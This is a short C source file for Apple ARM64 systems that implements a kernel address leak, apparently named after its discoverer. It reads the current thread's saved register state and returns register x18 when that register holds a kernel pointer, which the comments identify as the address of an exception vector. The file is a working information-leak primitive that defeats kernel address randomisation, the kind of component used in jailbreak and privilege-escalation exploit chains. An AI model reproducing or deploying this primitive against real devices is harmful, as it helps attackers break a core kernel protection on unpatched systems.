#include "bazadleak.h"

#include <mach/mach.h>

uint64_t bazadleak() {
    mach_port_t thread = mach_thread_self(); //Get the thread of the current process
    
    //Get the state of the thread including debugging info like the value of processor registers.
    arm_thread_state64_t state;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(thread, ARM_THREAD_STATE64,
                                        (thread_state_t) &state, &count);
    mach_port_deallocate(mach_task_self(), thread);
    
    //Did we really get a state?
    if (kr != KERN_SUCCESS) {
        return 0;
    }
    
    //Get the value of register x18 from the thread state info and check whether it is a kernel pointer
    if ((state.__x[18] & 0xffffffff00000000) != 0xfffffff000000000) {
        return 0; //Return 0, as register x18 is not a kernel pointer
    }
    return state.__x[18]; //Return the address of Lel0_synchronous_vector_64_long
}
